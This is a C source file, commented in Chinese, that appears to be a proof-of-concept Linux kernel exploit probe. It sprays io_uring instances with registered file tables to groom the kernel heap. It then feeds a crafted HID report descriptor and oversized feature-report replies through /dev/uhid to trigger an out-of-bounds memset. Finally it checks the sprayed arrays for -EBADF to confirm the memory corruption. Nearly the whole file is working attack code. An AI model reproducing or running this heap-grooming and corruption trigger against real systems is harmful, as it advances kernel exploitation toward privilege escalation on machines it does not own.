/* cz6.c — 最简 memset 实锤探针
 * 64 数组填 2 页 → 释放最后一个(必在 c->page) → 触发 → 检查其余 63 个
 * 若 memset 执行 ⇒ 零化 buf+121 起 128B ⇒ 必覆盖同页某个数组 ⇒ -EBADF
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/filter.h>

#define EVSZ 4380
static unsigned char ev[EVSZ];
static void wr32(int o, uint32_t v){ memcpy(ev+o,&v,4); }
static void wr16(int o, uint16_t v){ memcpy(ev+o,&v,2); }
static uint32_t rd32(int o){ uint32_t v; memcpy(&v,ev+o,4); return v; }

static const unsigned char wptp[] = {
0x05,0x0D,0x09,0x05,0xA1,0x01,
    0x85,0x01,
    0x09,0x56,0x24,0x00,0x26,0xFF,0xFF,0x75,0x10,0x95,0x01,0x81,0x02,
    0x09,0x54,0x25,0x05,0x75,0x08,0x81,0x02,
    0x05,0x20,0x0A,0x94,0x04,0x15,0x00,0x26,0xFF,0x0F,0x35,0x00,
    0x46,0xFF,0x0F,0x65,0x12,0x75,0x0C,0x95,0x01,0x81,0x02,
    0x05,0x0D,0x09,0x22,0xA1,0x02,
        0x09,0x51,0x25,0x0F,0x75,0x04,0x95,0x01,0x81,0x02,
        0x09,0x42,0x25,0x01,0x75,0x01,0x81,0x02,
        0x09,0x47,0x81,0x02,0x95,0x05,0x81,0x03,
        0x05,0x01,0x09,0x30,0x15,0x00,0x26,0xC8,0x00,0x35,0x00,
        0x45,0x69,0x65,0x11,0x75,0x10,0x95,0x01,0x81,0x02,
        0x09,0x31,0x26,0x96,0x00,0x45,0x4B,0x81,0x02,
        0x05,0x0D,0x09,0x30,0x15,0x00,0x26,0xFF,0x0F,0x35,0x00,
        0x46,0xFF,0x0F,0x65,0x12,0x75,0x0C,0x95,0x01,0x81,0x02,
    0xC0,
    0x05,0x09,0x09,0x01,0x15,0x00,0x25,0x01,0x75,0x01,0x95,0x01,
    0x81,0x02,0x95,0x07,0x81,0x03,
    0x85,0x02,
    0x05,0x0D,0x09,0x55,0x25,0x05,0x75,0x08,0x95,0x01,0xB1,0x02,
    0x09,0x59,0x25,0x02,0xB1,0x02,
    0x85,0x40,
    0x05,0x0D,0x09,0xB0,0x15,0x01,0x25,0x03,0x35,0x6E,0x45,0xBE,
    0x65,0x12,0x75,0x02,0x95,0x01,0xB1,0x02,
    0x85,0x41,
    0x05,0x0E,0x09,0x01,0xA1,0x02,
        0x09,0x23,0x15,0x00,0x25,0x04,0x75,0x08,0x95,0x01,0xB1,0x02,
    0xC0,
0xC0,
};
static unsigned char desc[4096];
static unsigned desc_len;
static void build_desc(void){
    static const unsigned char pad118[] = { 0x75,0x08, 0x95,0x76, 0xB1,0x03 };
    static const unsigned char rep3[]  = { 0x85,0x03, 0x75,0x08, 0x95,0xF8, 0xB1,0x03 };
    int pos=0,i=0,insA=-1;
    while(i<(int)sizeof(wptp)-5){
        if(wptp[i]==0x09&&wptp[i+1]==0x59&&wptp[i+2]==0x25&&wptp[i+3]==0x02
           &&wptp[i+4]==0xB1&&wptp[i+5]==0x02){insA=i+6;break;}
        i++;
    }
    memcpy(desc+pos,wptp,insA); pos+=insA;
    memcpy(desc+pos,pad118,sizeof(pad118)); pos+=sizeof(pad118);
    memcpy(desc+pos,rep3,sizeof(rep3)); pos+=sizeof(rep3);
    memcpy(desc+pos,wptp+insA,sizeof(wptp)-insA); pos+=sizeof(wptp)-insA;
    desc_len=pos;
}

static int create_legacy(int fd, const char *name){
    memset(ev,0,EVSZ); wr32(0,0);
    strncpy((char*)(ev+4),name,127); strncpy((char*)(ev+132),"virt-0",63);
    uint64_t p=(uint64_t)(uintptr_t)desc; memcpy(ev+260,&p,8);
    wr16(268,(uint16_t)desc_len); wr16(270,0x0003);
    wr32(272,0x1234); wr32(276,0x5678); wr32(280,1);
    ssize_t w=write(fd,ev,EVSZ);
    return w>0?0:-1;
}
static int destroy_dev(int fd){ memset(ev,0,EVSZ); wr32(0,1); return write(fd,ev,EVSZ)>0?0:-1; }

static long sys_setup(unsigned n,void*p){return syscall(425,n,p);}
static long sys_reg(unsigned fd,unsigned op,void*a,unsigned n){return syscall(427,fd,op,a,n);}
static char iovbuf[64];
static long sys_enter(unsigned fd,unsigned s,unsigned m,unsigned f,void*x){return syscall(426,fd,s,m,f,x);}

struct uctx {
    int fd;
    volatile uint32_t *sq_tail,*cq_head,*cq_tail;
    uint32_t sq_mask,cq_mask;
    uint32_t *sq_array;
    unsigned char *sqe;
    struct { uint64_t ud; int32_t res; uint32_t fl; } *cqes;
};
static struct uctx U[80];

static int new_arr(int slot){
    struct { uint32_t se,ce,f,sc,si,fe; uint32_t rv[4];
        struct { uint32_t h,t,m,e,f,d,a,r1; uint64_t r2; } so;
        struct { uint32_t h,t,m,e,ov,cq; uint64_t rv[2]; } co;
    } p; memset(&p,0,sizeof p);
    long fd = sys_setup(4,&p);
    if(fd<0) return -1;
    struct uctx *u = &U[slot]; memset(u,0,sizeof *u); u->fd = fd;
    unsigned char *sq = mmap(NULL, p.so.a+4*p.se, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0);
    unsigned char *cq = mmap(NULL, p.co.cq+16*p.ce, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0x8000000ULL);
    unsigned char *se = mmap(NULL, 4*p.se*64, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0x10000000ULL);
    if(sq==MAP_FAILED||cq==MAP_FAILED||se==MAP_FAILED) return -2;
    u->sq_tail=(uint32_t*)(sq+p.so.t); u->sq_array=(uint32_t*)(sq+p.so.a);
    u->sq_mask=*(uint32_t*)(sq+p.so.m);
    u->cq_head=(uint32_t*)(cq+p.co.h); u->cq_tail=(uint32_t*)(cq+p.co.t);
    u->cq_mask=*(uint32_t*)(cq+p.co.m);
    u->cqes=(void*)(cq+p.co.cq); u->sqe=se;
    int d[16];
    for(int j=0;j<16;j++) d[j]=dup(0);  /* dup stdin 作为占位 fd */
    if(sys_reg(fd,2,d,16)!=0){ for(int j=0;j<16;j++) close(d[j]); return -3; }
    for(int j=0;j<16;j++) close(d[j]);
    return slot;
}
static void free_arr(int slot){ if(U[slot].fd>0) sys_reg(U[slot].fd,3,NULL,0); }

static int do_readv(int slot){
    struct uctx *u = &U[slot];
    if(u->fd<=0) return -1000;
    struct { uint8_t op,fl; uint16_t io; int32_t fd; uint64_t off,addr;
             uint32_t len,rf; uint64_t ud; uint16_t bi; uint8_t p[6]; uint64_t p2[3]; } *e;
    uint32_t t = *u->sq_tail;
    e = (void*)(u->sqe + (t & u->sq_mask)*64);
    memset(e,0,64);
    e->op=1; e->fl=1; e->fd=0; e->addr=(uint64_t)(uintptr_t)iovbuf; e->len=1; e->ud=0x99;
    u->sq_array[t&u->sq_mask]=t&u->sq_mask; *u->sq_tail=t+1;
    long r = sys_enter(u->fd,1,1,1,NULL);
    if(r<0) return -2000-(int)errno;
    for(int k=0;k<50;k++){
        if(*u->cq_tail > *u->cq_head){
            uint32_t ch=*u->cq_head;
            int res=u->cqes[ch&u->cq_mask].res;
            *u->cq_head=ch+1;
            return res;
        }
        sys_enter(u->fd,0,1,1,NULL);
        usleep(2000);
    }
    return -3000;
}


int main(int argc, char **argv){
    setvbuf(stdout,NULL,_IONBF,0);
    int ncycles = argc>1 ? atoi(argv[1]) : 16;
    build_desc();
    { unsigned long m=4; syscall(122,0,sizeof(m),&m); }
    printf("=== cz6: %d cycles ===\n", ncycles);

    int slots[64]; int cnt=0;
    for(int i=0;i<64;i++){
        if(new_arr(i)<0) break;
        slots[cnt++]=i;
    }
    printf("allocated %d arrays\n", cnt);
    /* 对照 */
    int ok=0;
    for(int i=0;i<cnt;i++) if(do_readv(slots[i])==64) ok++;
    printf("control: %d/%d OK\n", ok, cnt);

    int ufd = open("/dev/uhid", O_RDWR|O_CLOEXEC);
    if(ufd<0){ printf("uhid open fail\n"); return 1; }
    int hits=0;
    /* 从最后一个数组开始逐个释放+触发 */
    for(int c=0; c<ncycles && cnt>0; c++){
        cnt--;
        free_arr(slots[cnt]);
        slots[cnt]=-1;
        usleep(500);
        if(create_legacy(ufd,"cz")<0) break;
        int got=0;
        for(int t=0;t<8;t++){
            struct timeval tv={0,250000};
            fd_set rf; FD_ZERO(&rf); FD_SET(ufd,&rf);
            if(select(ufd+1,&rf,NULL,NULL,&tv)<=0) continue;
            ssize_t r = read(ufd,ev,EVSZ);
            if(r<=0) continue;
            uint32_t type = rd32(0);
            if(type==9||type==13){
                uint8_t rnum = ev[8];
                int oob = (rnum==2);
                memset(ev,0,EVSZ);
                wr32(0, type==9?10:14);
                wr32(4,rd32(4)); wr16(8,0);
                wr16(10, oob?128:1);
                ev[12] = oob?3:0;
                write(ufd,ev,EVSZ);
                got = oob;
            }
        }
        destroy_dev(ufd);
        usleep(20000);
        /* 探测全部保留数组 */
        int nh=0;
        for(int i=0;i<64;i++){
            if(slots[i]<0) continue;
            int res = do_readv(slots[i]);
            if(res==-9){
                printf("★ slot%d=-9 ⇒ memset 实锤!!\n", slots[i]);
                hits++; nh++; slots[i]=-1;
            }
        }
        printf("[%d] nh=%d hits=%d\n", c+1, nh, hits);
    }
    printf("=== END hits=%d ===\n", hits);
    return hits>0?0:2;
}
